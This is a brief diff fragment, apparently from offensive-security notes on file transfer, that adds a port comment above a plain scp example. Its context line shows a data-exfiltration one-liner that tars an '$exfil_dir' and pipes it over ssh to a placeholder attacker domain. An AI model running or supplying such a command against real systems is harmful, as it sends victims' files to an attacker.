@@ -8,6 +8,7 @@ tar cf - $exfil_dir/ | ssh $attacker@$listening_domain.com "cd /tmp/; tar xpf -"
 
 If you do:
 ```bash
+# -P to specify port
 scp <file> <user>@<host>:<dest>
 
 # To copy a file from a remote server to your local machine:
